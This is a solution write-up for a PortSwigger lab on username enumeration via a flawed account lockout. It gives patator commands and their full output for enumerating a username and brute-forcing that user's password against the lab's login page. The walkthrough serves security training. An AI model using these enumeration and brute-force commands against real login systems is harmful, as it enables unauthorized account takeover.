# [Lab 5: Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)

## Description

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Solution

Use BurpSuite Intruder to send 10 login requests with an invalid username. Note that they *all* result in responses of length 3094 that each contain the string `Invalid username or password`.

![](images/Pasted%20image%2020210808164409.png)

Leverage the account lockout feature to enumerate users by attempting logins with each user in the username list 10 times. Ignore responses that contain the string `Invalid username or password`.

```bash
for username in $(cat users.txt); do
	for i in {1..10}; do
		echo $username >> usernamesx10.txt;
	done
done
```

```bash
$ patator http_fuzz url=https://ac701f6b1f08be2e801f2dfc007800c4.web-security-academy.net/login method=POST body='username=FILE0&password=blah' 0=usernamesx10.txt -x ignore:fgrep='Invalid username or password'

15:49:17 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-08 15:49 CDT
15:49:17 patator    INFO -
15:49:17 patator    INFO - code size:clen       time | candidate                          |   num | mesg
15:49:17 patator    INFO - -----------------------------------------------------------------------------
15:49:44 patator    INFO - 200  3233:3046      0.128 | ajax                               |   473 | HTTP/1.1 200 OK
15:49:44 patator    INFO - 200  3233:3046      0.126 | ajax                               |   474 | HTTP/1.1 200 OK
15:49:44 patator    INFO - 200  3233:3046      0.124 | ajax                               |   480 | HTTP/1.1 200 OK
15:49:44 patator    INFO - 200  3233:3046      0.126 | ajax                               |   471 | HTTP/1.1 200 OK
15:49:44 patator    INFO - 200  3233:3046      0.124 | ajax                               |   477 | HTTP/1.1 200 OK
15:49:44 patator    INFO - 200  3233:3046      0.127 | ajax                               |   478 | HTTP/1.1 200 OK
15:49:44 patator    INFO - 200  3233:3046      0.128 | ajax                               |   479 | HTTP/1.1 200 OK
15:50:15 patator    INFO - Hits/Done/Skip/Fail/Size: 7/1010/0/0/1010, Avg: 17 r/s, Time: 0h 0m 58s
```

The username `ajax` is the only one with responses that didn't contain the string `Invalid username or password`, indicating that `ajax` is likely a valid username whose account was locked out. Also note that there are 7 of these responses. This indicates that it takes 3 failed login attempts to lock out an account.

Under what conditions is the account unlocked, though? When an account is locked out, the application's response indicates that the account is locked for **one minute**.

![](images/Pasted%20image%2020210808165455.png)

Even though the account will be locked out after three failed login attempts, attempt to brute force `ajax`'s password with the given password list. The challenge description indicates that there is a logic flaw with the way the account lockout is implemented, and perhaps that logic flaw is that even when an account is locked out, if you attempt to login with correct credentials, it will respond differently than when it is locked out and you attempt to login with incorrect credentials.

```bash
$ patator http_fuzz url=https://ac701f6b1f08be2e801f2dfc007800c4.web-security-academy.net/login method=POST body='username=ajax&password=FILE0' 0=passwords.txt -x ignore:fgrep='Invalid username or password'

16:10:34 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-08 16:10 CDT                                                      
16:10:34 patator    INFO -                                                                                                                                                           
16:10:34 patator    INFO - code size:clen       time | candidate                          |   num | mesg                                                                             
16:10:34 patator    INFO - -----------------------------------------------------------------------------                                                                             
16:10:35 patator    INFO - 200  3233:3046      0.182 | 12345678                           |     3 | HTTP/1.1 200 OK                                                                  
16:10:35 patator    INFO - 200  3233:3046      0.186 | qwerty                             |     4 | HTTP/1.1 200 OK                                                                  
16:10:35 patator    INFO - 200  3233:3046      0.193 | 12345                              |     6 | HTTP/1.1 200 OK                                                                  
16:10:35 patator    INFO - 200  3233:3046      0.162 | 1234                               |     7 | HTTP/1.1 200 OK                                                                  
16:10:35 patator    INFO - 200  3233:3046      0.145 | 111111                             |     8 | HTTP/1.1 200 OK                                                                  
16:10:35 patator    INFO - 200  3233:3046      0.163 | 1234567                            |     9 | HTTP/1.1 200 OK                                                                  
16:10:35 patator    INFO - 200  3233:3046      0.141 | dragon                             |    10 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.129 | 123123                             |    11 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.129 | baseball                           |    12 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.130 | abc123                             |    13 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.125 | football                           |    14 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.128 | monkey                             |    15 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.128 | letmein                            |    16 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.125 | shadow                             |    17 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.124 | 666666                             |    19 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.126 | master                             |    18 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.126 | qwertyuiop                         |    20 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.125 | 123321                             |    21 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.133 | mustang                            |    22 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.126 | 1234567890                         |    23 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.137 | michael                            |    24 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.128 | 654321                             |    25 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.132 | superman                           |    26 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.139 | 1qaz2wsx                           |    27 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.128 | 7777777                            |    28 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.127 | 121212                             |    29 | HTTP/1.1 200 OK                                                                  
16:10:36 patator    INFO - 200  3233:3046      0.138 | 000000                             |    30 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.134 | qazwsx                             |    31 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.126 | 123qwe                             |    32 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.125 | killer                             |    33 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.129 | jordan                             |    35 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.128 | trustno1                           |    34 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.129 | jennifer                           |    36 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.126 | zxcvbnm                            |    37 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.120 | asdfgh                             |    38 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.124 | hunter                             |    39 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.127 | buster                             |    40 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.128 | soccer                             |    41 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.128 | harley                             |    42 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.135 | batman                             |    43 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.128 | tigger                             |    45 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.130 | sunshine                           |    46 | HTTP/1.1 200 OK                                                                  
16:10:37 patator    INFO - 200  3233:3046      0.132 | charlie                            |    49 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.131 | andrew                             |    44 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.128 | iloveyou                           |    47 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.135 | 2000                               |    48 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.126 | robert                             |    50 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.130 | thomas                             |    51 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.130 | hockey                             |    52 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.127 | starwars                           |    55 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.129 | ranger                             |    53 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.124 | daniel                             |    54 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.131 | klaster                            |    56 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.128 | 112233                             |    57 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.127 | computer                           |    59 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.132 | george                             |    58 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.131 | michelle                           |    60 | HTTP/1.1 200 OK
16:10:38 patator    INFO - 200  3233:3046      0.127 | pepper                             |    62 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.127 | jessica                            |    61 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.128 | 1111                               |    63 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.129 | zxcvbn                             |    64 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.130 | 555555                             |    65 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.134 | 11111111                           |    66 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.131 | 777777                             |    69 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.127 | 131313                             |    67 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.127 | freedom                            |    68 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.134 | pass                               |    70 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.132 | maggie                             |    71 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.122 | 159753                             |    72 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.125 | princess                           |    75 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.124 | aaaaaa                             |    73 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.126 | ginger                             |    74 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.125 | joshua                             |    76 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.128 | cheese                             |    77 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.129 | summer                             |    79 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.129 | amanda                             |    78 | HTTP/1.1 200 OK
16:10:39 patator    INFO - 200  3233:3046      0.129 | love                               |    80 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.126 | ashley                             |    81 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3103:2916      0.129 | nicole                             |    82 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.135 | chelsea                            |    83 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.126 | matthew                            |    85 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.133 | biteme                             |    84 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.147 | access                             |    86 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.126 | yankees                            |    87 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.125 | 987654321                          |    88 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.145 | dallas                             |    89 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.134 | austin                             |    90 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.125 | thunder                            |    91 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.126 | taylor                             |    92 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.127 | mom                                |    95 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.127 | matrix                             |    93 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.130 | monitor                            |    96 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.129 | moon                               |    99 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.128 | mobilemail                         |    94 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.129 | monitoring                         |    97 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.129 | montana                            |    98 | HTTP/1.1 200 OK
16:10:40 patator    INFO - 200  3233:3046      0.129 | moscow                             |   100 | HTTP/1.1 200 OK
16:10:41 patator    INFO - Hits/Done/Skip/Fail/Size: 97/100/0/0/100, Avg: 15 r/s, Time: 0h 0m 6s
```

Note that logging in with the password `nicole` results in a different length response than all other responses. This could indicate that `nicole` is `ajax`'s password, since the application returned a different response despite the account being locked.

Wait for the lockout to end, attempt to login with these credentials, and solve the challenge.
